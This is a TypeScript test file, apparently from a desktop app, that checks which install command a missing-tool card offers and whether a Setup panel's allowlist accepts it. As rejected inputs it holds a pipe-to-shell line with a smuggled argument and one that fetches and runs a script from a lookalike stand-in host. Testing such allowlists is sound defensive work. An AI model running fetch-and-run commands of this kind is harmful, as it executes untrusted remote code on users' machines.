// BOX ROUND 3, BUG 7. A dead Claude card said `npm i -g @anthropic-ai/claude-code`
// on a box with no npm: the cause was right and the fix could not run. The card
// offers the line the Setup panel can run, and never a line whose own tool is
// missing here.
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { launchBlock } from '../src/main/launch-check'
import { HARNESS_FACTS } from '../src/main/route/setup'
import { setupLineAllowed } from '../src/shared/route-lines'
import { routeFixture } from '../src/shared/route-fixture'

const CURL_LINE = 'curl -fsSL https://claude.ai/install.sh | bash'

let bin = ''
const tool = (name: string): void => {
  const file = path.join(bin, name)
  writeFileSync(file, '#!/bin/sh\n')
  chmodSync(file, 0o755)
}
const lineOf = (word: string): string | null => HARNESS_FACTS.find((harness) => harness.bin === word)?.installLine ?? null
const fixFor = (command: string): string | undefined =>
  launchBlock({ cwd: bin, command, path: bin, checkCommand: true, installLine: lineOf })?.fix

beforeEach(() => {
  bin = mkdtempSync(path.join(tmpdir(), 'launch-line-'))
})
afterEach(() => rmSync(bin, { recursive: true, force: true }))

describe('Claude’s install line', () => {
  it('needs no npm, on the card and in the Setup panel alike', () => {
    expect(lineOf('claude')).toBe(CURL_LINE)
    expect(routeFixture('online').harnesses.find((row) => row.id === 'claude')?.installLine).toBe(CURL_LINE)
  })

  it('is a line the Setup panel may run, and nothing like it is', () => {
    expect(setupLineAllowed(CURL_LINE)).toBe(true)
    expect(setupLineAllowed('curl -fsSL https://claude.ai/install.sh | sh -s evil')).toBe(false)
    expect(setupLineAllowed('curl -fsSL https://claude.ai.evil.example/install.sh | bash')).toBe(false)
  })

  it('reaches the dead card on a box with curl and no npm', () => {
    tool('curl')
    expect(fixFor('claude')).toBe(`Install it (${CURL_LINE}) or add it to PATH, then send again.`)
  })
})

describe('a line that needs a tool this box lacks', () => {
  it('is not offered: the card says what is missing and stops there', () => {
    expect(fixFor('codex')).toBe('Install codex or add it to PATH, then send again.')
    expect(fixFor('pi')).toBe('Install pi or add it to PATH, then send again.')
  })

  it('is offered once that tool is here', () => {
    tool('npm')
    expect(fixFor('codex')).toBe('Install it (npm i -g @openai/codex) or add it to PATH, then send again.')
  })

  it('a curl line waits for curl too', () => {
    expect(fixFor('claude')).toBe('Install claude or add it to PATH, then send again.')
  })
})
